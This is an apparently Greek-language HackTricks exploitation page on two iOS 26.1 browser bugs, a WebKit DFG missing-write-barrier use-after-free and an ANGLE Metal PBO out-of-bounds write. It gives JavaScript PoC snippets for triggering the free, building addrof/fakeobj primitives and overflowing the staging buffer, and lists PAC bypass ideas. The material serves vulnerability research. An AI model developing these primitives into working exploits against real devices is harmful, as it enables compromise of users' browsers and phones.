# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)

{{#include ../../banners/hacktricks-training.md}}

## Περίληψη
- **DFG Store Barrier bug (CVE-2025-43529)**: Στο `DFGStoreBarrierInsertionPhase.cpp`, ένας **Phi node επισημασμένος ως escaped ενώ οι Upsilon είσοδοι του δεν είναι** προκαλεί τη φάση να **παραλείψει την εισαγωγή ενός write barrier** σε επακόλουθες αποθηκεύσεις αντικειμένων. Υπό πίεση του GC αυτό επιτρέπει στο JSC να απελευθερώσει αντικείμενα που εξακολουθούν να είναι προσβάσιμα → **use-after-free**.
- **Exploit target**: Αναγκάστε ένα αντικείμενο **Date** να υλοποιήσει ένα butterfly (π.χ., `a[0] = 1.1`) ώστε το butterfly να απελευθερωθεί, και στη συνέχεια να **reclaimed** ως αποθηκευτικός χώρος στοιχείων πίνακα για να κατασκευαστεί σύγχυση boxed/unboxed → `addrof`/`fakeobj` primitives.
- **ANGLE Metal PBO bug (CVE-2025-14174)**: Το Metal backend δεσμεύει το PBO staging buffer χρησιμοποιώντας `UNPACK_IMAGE_HEIGHT` αντί για το πραγματικό ύψος της υφής. Παρέχοντας ένα πολύ μικρό unpack height και στη συνέχεια εκτελώντας ένα μεγάλο `texImage2D` προκαλεί **staging-buffer OOB write** (~240KB στο PoC παρακάτω).
- **PAC blockers on arm64e (iOS 26.1)**: Το TypedArray `m_vector` και το JSArray `butterfly` είναι PAC-signed· η πλαστογράφηση fake objects με δείκτες επιλεγμένους από τον attacker οδηγεί σε κατάρρευση με `EXC_BAD_ACCESS`/`EXC_ARM_PAC`. Μόνο η επαναχρησιμοποίηση **already-signed** butterflies (boxed/unboxed reinterpretation) λειτουργεί.

## Προκαλώντας την ελλείπουσα barrier του DFG → UAF
```js
function triggerUAF(flag, allocCount) {
const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
arr[arr_index] = A;                 // Tenure A in old space
const a = new Date(1111); a[0] = 1.1; // Force Date butterfly

// GC pressure
for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));

const b = {p0: 0x42424242, p1: 1.1};
let f = b; if (flag) f = 1.1;       // Phi escapes, Upsilon not escaped
A.p1 = f;                           // Missing barrier state set up

for (let i = 0; i < 1e6; ++i) {}    // GC race window
b.p1 = a;                           // Store without barrier → frees `a`/butterfly
}
```
Key points:
- Τοποθετήστε **A** στο old space για να ενεργοποιήσετε τα generational barriers.
- Δημιουργήστε ένα indexed **Date** ώστε το **butterfly** να είναι ο στόχος που απελευθερώνεται.
- Spray `ArrayBuffer(0x800000)` για να αναγκάσετε το GC και να διευρύνετε το race.
- Η mismatch στο Phi/Upsilon escape σταματά την εισαγωγή barrier· το `b.p1 = a` εκτελείται **χωρίς write barrier**, οπότε το GC ανακτά το `a`/butterfly.

## Ανάκτηση Butterfly → σύγχυση boxed/unboxed
Αφού το GC απελευθερώσει το Date butterfly, κάντε spray arrays ώστε το freed slab να επαναχρησιμοποιηθεί ως elements για δύο arrays με διαφορετικά element kinds:
```js
boxed_arr[0]   = obj;          // store as boxed pointer
const addr     = ftoi(unboxed_arr[0]); // read as float64 → addr leak
unboxed_arr[0] = itof(addr);   // write pointer bits as float
const fake     = boxed_arr[0]; // reinterpret as object → fakeobj
```
Κατάσταση σε **iOS 26.1 (arm64e)**:
- **Λειτουργεί:** `addrof`, `fakeobj`, 20+ address leaks per run, inline-slot read/write (σε γνωστά inline fields).
- **Δεν είναι ακόμη σταθερό:** generalized `read64`/`write64` via inline-slot backings.

## Περιορισμοί PAC στο arm64e (why fake objects crash)
- **TypedArray `m_vector`** και **JSArray `butterfly`** είναι PAC-signed; η παραχάραξη δεικτών οδηγεί σε `EXC_BAD_ACCESS` / πιθανό `EXC_ARM_PAC`.
- Το confusion primitive λειτουργεί επειδή **reuses legitimate signed butterflies**; η εισαγωγή unsigned attacker pointers αποτυγχάνει στην authentication.
- Σημειώθηκαν πιθανές ιδέες bypass: JIT paths that skip auth, gadgets that sign attacker pointers, or pivoting through the ANGLE OOB.

## ANGLE Metal PBO under-allocation → OOB write
Χρησιμοποιήστε ένα πολύ μικρό unpack height για να συρρικνώσετε το staging buffer, στη συνέχεια ανεβάστε ένα μεγάλο texture ώστε η αντιγραφή να υπερβεί τα όρια:
```js
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height
// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```
Σημειώσεις:
- Σφάλμα στο `TextureMtl.cpp`: το staging buffer χρησιμοποιεί `UNPACK_IMAGE_HEIGHT` αντί για το πραγματικό ύψος της υφής στη διαδρομή PBO.
- Στο σχετικό probe το WebGL2 PBO trigger είναι υλοποιημένο αλλά δεν έχει ακόμα παρατηρηθεί αξιόπιστα στο iOS 26.1.

## Αναφορές
- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)

{{#include ../../banners/hacktricks-training.md}}
